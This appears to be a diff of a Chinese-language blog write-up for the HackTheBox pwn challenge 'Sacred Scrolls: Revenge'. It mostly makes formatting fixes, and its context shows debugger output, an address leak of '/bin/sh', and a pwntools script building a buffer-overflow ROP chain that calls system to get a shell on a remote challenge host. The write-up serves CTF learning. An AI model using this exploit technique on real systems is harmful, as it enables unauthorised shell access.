@@ -2,7 +2,7 @@
 title: "【HTB Challenge】Sacred Scrolls: Revenge"
 date: 2024-03-05
 tags:
-  - ctf
+  - security
 url: "/posts/HTB/Sacred-Scrolls-Revenge/"
 ---
 
@@ -124,11 +124,10 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 
 1. Upload
 2. read
-2. Cast
-3. Leave
+3. Cast
+4. Leave
 
 而由於 read() 後面不會補 `'\0'`，printf 可能會印出垃圾。
-
 
 ### upload()
 
@@ -181,7 +180,7 @@ int spell_upload()
 
 ### read()
 
-```c 
+```c
 char *spell_read()
 {
   FILE *stream; // [rsp+10h] [rbp-10h]
@@ -217,7 +216,7 @@ $ echo -e "\xF0\x9F\x91\x93\xE2\x9A\xA1"
 
 ### save()
 
-```c 
+```c
 int __fastcall spell_save(const void *a1)
 {
   char dest[32]; // [rsp+10h] [rbp-20h] BYREF
@@ -239,30 +238,30 @@ int __fastcall spell_save(const void *a1)
 中斷在輸入 wizard_tag 的地方看看
 
 ```sh
-Enter your wizard tag: ^C                                                                                                                                            
-Program received signal SIGINT, Interrupt.                                                                                                                           
-0x00007ffff7d14992 in read () from ./glibc/libc.so.6                                                                                                                 
+Enter your wizard tag: ^C
+Program received signal SIGINT, Interrupt.
+0x00007ffff7d14992 in read () from ./glibc/libc.so.6
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $rax   : 0xfffffffffffffe00
-$rbx   : 0x0               
+$rbx   : 0x0
 $rcx   : 0x00007ffff7d14992  →  0x5677fffff0003d48 ("H="?)
-$rdx   : 0x5ff             
+$rdx   : 0x5ff
 $rsp   : 0x00007fffffffd598  →  0x0000000000400f94  →  <main+178> mov rax, QWORD PTR [rbp-0x38]
 $rbp   : 0x00007fffffffdca0  →  0x0000000000000001
 $rsi   : 0x00007fffffffd5a0  →  0x000000000000001f
-$rdi   : 0x0               
+$rdi   : 0x0
 $rip   : 0x00007ffff7d14992  →  0x5677fffff0003d48 ("H="?)
-$r8    : 0x18              
-$r9    : 0x7fffffff        
+$r8    : 0x18
+$r9    : 0x7fffffff
 $r10   : 0x0000000000401f46  →  "\nEnter your wizard tag: "
-$r11   : 0x246             
-$r12   : 0x600             
-$r13   : 0x0               
-$r14   : 0x600             
-$r15   : 0x0               
+$r11   : 0x246
+$r12   : 0x600
+$r13   : 0x0
+$r14   : 0x600
+$r15   : 0x0
 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fffffffd598│+0x0000: 0x0000000000400f94  →  <main+178> mov rax, QWORD PTR [rbp-0x38]      ← $rsp
 0x00007fffffffd5a0│+0x0008: 0x000000000000001f   ← $rsi
@@ -275,10 +274,10 @@ $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
    0x7ffff7d1498c <read+12>        test   eax, eax
    0x7ffff7d1498e <read+14>        jne    0x7ffff7d149a0 <read+32>
-   0x7ffff7d14990 <read+16>        syscall 
+   0x7ffff7d14990 <read+16>        syscall
  → 0x7ffff7d14992 <read+18>        cmp    rax, 0xfffffffffffff000
    0x7ffff7d14998 <read+24>        ja     0x7ffff7d149f0 <read+112>
-   0x7ffff7d1499a <read+26>        ret    
+   0x7ffff7d1499a <read+26>        ret
    0x7ffff7d1499b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
    0x7ffff7d149a0 <read+32>        sub    rsp, 0x28
    0x7ffff7d149a4 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
@@ -304,7 +303,7 @@ gef➤  x/20gx $rsi
 0x7fffffffd610: 0x0000000000000000      0x0000000000000000
 0x7fffffffd620: 0x0000000000000000      0x00007ffff7fce37c
 0x7fffffffd630: 0x00007ffff7fbb1f0      0x00007ffff7c04ad0
-gef➤  
+gef➤
 ```
 
 其中記憶體位置是 0x7fff 開頭的全都是 libc 相關的位址，看看第一個是什麼
@@ -312,7 +311,7 @@ gef➤
 ```sh
 gef➤  x/s 0x00007ffff7dd8698
 0x7ffff7dd8698: "/bin/sh"
-gef➤  
+gef➤
 ```
 
 超幸運！第一個就是熟悉的 `/bin/sh`，而這個位址在 `wizard_tag+16` 的地方，
@@ -330,7 +329,7 @@ gef➤
 利用 ROPgadget
 
 ```sh
-$ ROPgadget --binary ./sacred_scrolls 
+$ ROPgadget --binary ./sacred_scrolls
 ```
 
 找到需要的 gadget 分別在 0x4011b3 以及 0x4007ce
@@ -339,8 +338,6 @@ $ ROPgadget --binary ./sacred_scrolls
 
 最後就是 get shell，cat flag.txt！
 
-
-
 ## Solution
 
 ```py
@@ -348,10 +345,10 @@ $ ROPgadget --binary ./sacred_scrolls
 #!/usr/bin/env python3
 from pwn import *
 import os
-                                                                                                                                                                     
-context.os = 'linux'                                                                                                                                                 
-context.arch = 'amd64'                                                                                                                                               
-context.log_level = 'DEBUG'                                                                                                                                          
+
+context.os = 'linux'
+context.arch = 'amd64'
+context.log_level = 'DEBUG'
 
 if args.REMOTE:
     ip = '83.136.249.57'
@@ -361,7 +358,7 @@ else:
     p = process('./sacred_scrolls')
 
 elf = ELF('./sacred_scrolls')
-    
+
 p.sendafter(b'tag: ', b'A' * 16)
 p.recvuntil(b'A' * 16)
 bin_sh_adr = u64(p.recvline().strip().ljust(8, b'\0'))
@@ -376,10 +373,10 @@ system_plt = elf.plt['system']
 
 payload = b'\xf0\x9f\x91\x93\xe2\x9a\xa1'
 
-payload += b'A' * 33 
-payload += p64(pop_rdi_ret) 
-payload += p64(bin_sh_adr) 
-payload += p64(ret) 
+payload += b'A' * 33
+payload += p64(pop_rdi_ret)
+payload += p64(bin_sh_adr)
+payload += p64(ret)
 payload += p64(system_plt)
 
 f = open('spell.txt', 'wb')
